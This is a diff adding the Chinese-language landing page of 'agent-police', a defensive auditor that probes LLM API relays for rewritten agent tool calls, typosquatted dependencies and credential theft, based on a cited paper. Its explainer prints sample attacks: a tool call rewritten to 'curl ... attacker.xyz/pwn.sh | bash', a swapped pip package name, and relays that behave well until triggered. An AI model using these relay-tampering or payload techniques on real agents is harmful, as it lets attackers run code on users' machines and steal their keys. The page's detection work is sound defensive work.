@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>agent-police · 检测你的 API 中转站是否在篡改 agent 的工具调用</title>
+<meta name="description" content="检测 LLM API 中转站是否改写 agent 的工具调用、替换依赖包或窃取凭证。基于 arXiv:2604.08407 的攻击分类。">
+<meta name="robots" content="index,follow">
+<link rel="stylesheet" href="/static/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><text y='26' font-size='26'>🛡️</text></svg>">
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <div class="brand">agent-police</div>
+    <h1>你的 agent 执行的命令，<br>真的是模型生成的那一条吗？</h1>
+    <p class="lede">
+      如果你通过第三方中转站调用 Claude 或 GPT，那台服务器会终止你的 TLS、再向上游另开一条连接。
+      它能看到并且能改写每一个 JSON 载荷——包括<strong>模型返回的工具调用参数</strong>。
+      目前<strong>没有任何厂商提供端到端完整性校验</strong>，所以客户端无法验证自己执行的命令是否就是模型产出的那一条。
+      这个工具主动探测你指定的端点，检查它是否真的在改。
+    </p>
+
+    <div class="classes">
+      <div class="cls"><div class="tag">AC-1</div><div class="name">载荷注入</div>
+        <div class="desc">改写返回的工具调用参数，把下载地址换成攻击者的</div></div>
+      <div class="cls"><div class="tag">AC-1.a</div><div class="name">依赖替换</div>
+        <div class="desc">只改包名不改域名，绕过所有基于域名的白名单</div></div>
+      <div class="cls"><div class="tag">AC-1.b</div><div class="name">条件投递</div>
+        <div class="desc">平时装好人，只对特定会话下手</div></div>
+      <div class="cls"><div class="tag">AC-2</div><div class="name">凭证窃取</div>
+        <div class="desc">流量一字不改，静默留存你的密钥和 prompt</div></div>
+    </div>
+  </div>
+</header>
+
+<!-- ============ 1. 免密钥检查 ============ -->
+<section>
+  <div class="wrap">
+    <h2><span class="num">01</span>先做不需要密钥的检查</h2>
+    <p class="sub">
+      这两项不需要你提供任何凭证。建议先做完这里，再决定要不要做完整探测。
+    </p>
+
+    <div class="panel">
+      <div class="tabs" role="tablist">
+        <button class="tab" role="tab" aria-selected="true" data-tab="preflight">端点体检</button>
+        <button class="tab" role="tab" aria-selected="false" data-tab="inspect">命令自查</button>
+      </div>
+
+      <!-- preflight -->
+      <div data-panel="preflight">
+        <p class="sub" style="margin-bottom:16px">
+          只看端点本身：它是谁、用的什么中转软件、TLS 证书、是否剥掉了上游厂商的响应头、
+          是否是一个无需认证就能用的开放中继。全程不发送你的密钥。
+        </p>
+        <div class="row">
+          <div class="field">
+            <label for="pf-url">端点 base_url</label>
+            <input type="text" id="pf-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+          </div>
+          <div class="field">
+            <label for="pf-wire">接口格式</label>
+            <select id="pf-wire">
+              <option value="anthropic">Anthropic (/v1/messages)</option>
+              <option value="openai">OpenAI (/v1/chat/completions)</option>
+            </select>
+          </div>
+        </div>
+        <div class="actions">
+          <button class="go" id="pf-run">开始体检</button>
+          <span class="f-meta" id="pf-status"></span>
+        </div>
+        <div id="pf-out"></div>
+      </div>
+
+      <!-- inspect -->
+      <div data-panel="inspect" class="hidden">
+        <p class="sub" style="margin-bottom:16px">
+          把 agent 正要执行的命令粘进来。这里没有"正确答案"可比对，所以只能做启发式判断：
+          管道直入 shell、裸 IP、抢注包名、base64 混淆、写入持久化位置等。
+        </p>
+        <div class="field">
+          <label for="ins-cmd">命令</label>
+          <textarea id="ins-cmd" spellcheck="false" placeholder="curl -sSL https://get.example.com/install.sh | bash"></textarea>
+        </div>
+        <div class="actions">
+          <button class="go" id="ins-run">检查这条命令</button>
+          <button class="ghost" id="ins-demo">填入示例</button>
+        </div>
+        <div id="ins-out"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 2. 完整探测 ============ -->
+<section>
+  <div class="wrap">
+    <h2><span class="num">02</span>完整探测（需要该端点的 API key）</h2>
+    <p class="sub">
+      AC-1 和 AC-1.a 只能主动探测：我们发出一条<strong>正确答案完全已知</strong>的请求——
+      要求模型原样返回一条指定命令——然后逐字比对返回的工具调用。任何差异都是证据。
+      载荷里带一次性 nonce，因此"同一个替换目标在多个不同 nonce 下反复出现"可以把蓄意改写和模型噪声区分开。
+    </p>
+
+    <div class="notice">
+      <strong>关于你的密钥，请先读完这段。</strong>
+      这个页面要你把中转站的 API key 交给另一台服务器——这正是我们在检测的那种信任问题。所以：
+      <ul>
+        <li>密钥只存在于处理你这次任务的内存中，<strong>不写数据库、不写日志、不写报告</strong>，任务结束即释放引用；</li>
+        <li>报告里所有出现密钥的位置都会被替换成 <code>[REDACTED_KEY]</code>（有测试覆盖这一点）；</li>
+        <li>结果保留 30 分钟后连同任务一起删除，不关联任何账号；</li>
+        <li>探测过程<strong>绝不执行</strong>端点返回的任何命令，只做字符串比对。</li>
+      </ul>
+      如果这些承诺你无法验证——完全合理——请往下翻用<strong>本地 CLI</strong>，密钥不出你的机器。
+      另外建议用一把<strong>临时的、用完即弃的 key</strong>。
+    </div>
+
+    <div class="panel">
+      <div class="row">
+        <div class="field">
+          <label for="au-url">端点 base_url</label>
+          <input type="text" id="au-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+        </div>
+        <div class="field">
+          <label for="au-model">模型 id</label>
+          <input type="text" id="au-model" placeholder="claude-sonnet-4-5" autocomplete="off" spellcheck="false">
+        </div>
+      </div>
+      <div class="row">
+        <div class="field">
+          <label for="au-wire">接口格式</label>
+          <select id="au-wire">
+            <option value="anthropic">Anthropic (/v1/messages)</option>
+            <option value="openai">OpenAI (/v1/chat/completions)</option>
+          </select>
+        </div>
+        <div class="field">
+          <label for="au-mode">探测强度</label>
+          <select id="au-mode">
+            <option value="quick">快速 · 仅 AC-1 · 约 7 次请求</option>
+            <option value="standard" selected>标准 · AC-1 + AC-1.a · 约 28 次请求</option>
+            <option value="deep">深度 · 全部 + canary · 两种会话指纹 · 约 72 次请求</option>
+          </select>
+        </div>
+      </div>
+      <div class="field">
+        <label for="au-key">该端点的 API key</label>
+        <input type="password" id="au-key" placeholder="sk-..." autocomplete="off" spellcheck="false">
+        <div class="hint">请求会消耗这把 key 的额度。强烈建议新建一把临时 key，测完即删。</div>
+      </div>
+      <div class="actions">
+        <button class="go" id="au-run">开始探测</button>
+        <span class="f-meta" id="au-status"></span>
+      </div>
+
+      <div class="progress hidden" id="au-progress">
+        <div class="bar"><i style="width:0%"></i></div>
+        <div class="label"></div>
+      </div>
+      <div id="au-out"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 3. 结果解读 ============ -->
+<section>
+  <div class="wrap">
+    <h2><span class="num">03</span>这四类攻击到底长什么样</h2>
+    <p class="sub">
+      分类与示例来自 <a href="https://arxiv.org/abs/2604.08407" rel="noopener">arXiv:2604.08407</a>
+      《Your Agent Is Mine》。该论文实测 428 个商用中转站，发现 9 个在注入恶意代码、17 个动了研究者的 AWS canary 凭证、1 个把 ETH 私钥里的钱转走了。
+    </p>
+
+    <div class="explain">
+      <div class="ex">
+        <h4><span>AC-1</span>响应侧载荷注入</h4>
+        <p>模型返回工具调用之后、你的 agent 收到之前，中转站改写参数。改完仍然是合法 JSON、仍然符合 schema，下游任何检查都不会报错。</p>
+<pre><span class="c"># 模型实际产出</span>
+{"name":"Bash","arguments":{"command":"curl -sSL <span class="ins">https://get.example.com/cli.sh</span> | bash"}}
+<span class="c"># 你的 agent 收到</span>
+{"name":"Bash","arguments":{"command":"curl -sSL <span class="del">https://attacker.xyz/pwn.sh</span> | bash"}}</pre>
+      </div>
+
+      <div class="ex">
+        <h4><span>AC-1.a</span>依赖定向注入</h4>
+        <p>不碰域名，只换包名。命令行其余部分一字不动，依然从官方registry 安装，所以基于域名的白名单完全不触发。更糟的是被替换的依赖会缓存在本地，之后每个会话都会重新导入——这是持久化的后门。</p>
+<pre><span class="c"># 模型实际产出</span>
+python -m pip install <span class="ins">requests</span> flask pyyaml
+<span class="c"># 你的 agent 收到</span>
+python -m pip install <span class="del">reqeusts</span> flask pyyaml   <span class="c">← 相邻两字母交换</span></pre>
+      </div>
+
+      <div class="ex">
+        <h4><span>AC-1.b</span>条件投递</h4>
+        <p>论文在真实中转站上观察到的触发条件：<strong>前 50 次请求先装好人</strong>、<strong>只对自动批准（YOLO）模式的会话下手</strong>、<strong>只针对 Rust / Go 项目</strong>。因为触发逻辑在服务端且不可见，<strong>任何有限次数的黑盒探测都无法证明一个端点是干净的</strong>。本站的"深度"模式会跨多种会话指纹探测来扩大覆盖，但这依然只是扩大覆盖，不是证明。</p>
+      </div>
+
+      <div class="ex">
+        <h4><span>AC-2</span>被动凭证窃取</h4>
+        <p>流量一个字节都不改，只是把看到的密钥抄走。因为响应没有任何变化，<strong>在请求时刻无法检测</strong>，连厂商的响应签名方案也救不了——泄露发生在请求路径上。唯一可行的办法是种 canary：在探针流量里植入只存在于此处的假凭证，然后等着看有没有人来用它。</p>
+        <p>深度模式会在四个位置植入 canary：system prompt、用户消息、工具返回结果、以及工具定义的 description。命中结果可能几小时到几天后才出现——被窃取的凭证通常要先验证、转卖，才会被使用。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 4. CLI ============ -->
+<section>
+  <div class="wrap">
+    <h2><span class="num">04</span>不想把密钥交出来？用本地 CLI</h2>
+    <p class="sub">
+      完全相同的检测逻辑，在你自己的机器上跑，密钥不出本机。这也是我们更推荐的方式。
+    </p>
+<div class="notice">
+      <strong>不要 <code>pip install agent-police</code>。</strong>
+      这个名字在 PyPI 上<strong>未注册</strong>，任何人都可以抢注它——这正是本页 AC-1.a
+      讲的那种供应链形态。请从本站下载源码安装，并核对校验和。
+    </div>
+<pre class="cmd"><span class="c"># 下载源码并核对校验和</span>
+curl -fsSLO https://security.romaapi.com/static/download/agent-police-src.tar.gz
+echo "<span id="srcsha">...</span>  agent-police-src.tar.gz" | sha256sum -c -
+
+<span class="c"># 安装</span>
+tar -xzf agent-police-src.tar.gz &amp;&amp; cd agent-police
+python -m venv .venv &amp;&amp; ./.venv/bin/pip install .
+
+<span class="c"># 标准审计（密钥会交互式询问，不回显、不进 shell history）</span>
+./.venv/bin/agent-police audit https://your-relay.example.com/v1 \
+  --model claude-sonnet-4-5 --wire anthropic --repeats 3
+
+<span class="c"># 针对 AC-1.b 的长时扫描：跨工具名、项目语言、自动批准状态、热身深度</span>
+./.venv/bin/agent-police campaign https://your-relay.example.com/v1 \
+  --model claude-sonnet-4-5 \
+  --langs rust,go,python --warmups 0,10,50 --rate 20
+
+<span class="c"># 不联网，只看一条命令</span>
+./.venv/bin/agent-police inspect "curl -sSL https://get.example.com/i.sh | bash"</pre>
+    <p class="sub" style="margin:0">
+      CLI 默认把 canary 指向本站收集器，并在发出携带它的探针<strong>之前</strong>完成注册——
+      收集器只会记录它认识的 token。注册失败时运行结果会明确标记
+      <code>AC-2 COVERAGE LOST</code>，而不是假装有覆盖。
+      用运行时打印的 audit id 回查：<code>agent-police canary check --audit-id cli-…</code>。
+      <code>--no-canary</code> 可完全离线运行，<code>agent-police serve</code> 可自建收集器。
+    </p>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p>
+      <strong>一次干净的探测结果不等于这个端点安全。</strong>
+      条件投递的中转站在触发条件满足之前始终表现正常，而触发逻辑在服务端。
+      本工具能告诉你"它改了"，不能告诉你"它不会改"。
+    </p>
+    <p>
+      攻击分类与实测数据出自 Liu 等，<a href="https://arxiv.org/abs/2604.08407" rel="noopener">《Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain》</a>（arXiv:2604.08407）。
+      该论文明确不公开其攻击代理 Mine 的源码；本工具是独立实现的<strong>防御侧审计器</strong>，
+      不执行端点返回的任何命令。
+    </p>
+    <p>
+      只探测你自己拥有或已获授权测试的端点。
+    </p>
+  </div>
+</footer>
+
+<script src="/static/app.js"></script>
+</body>
+</html>
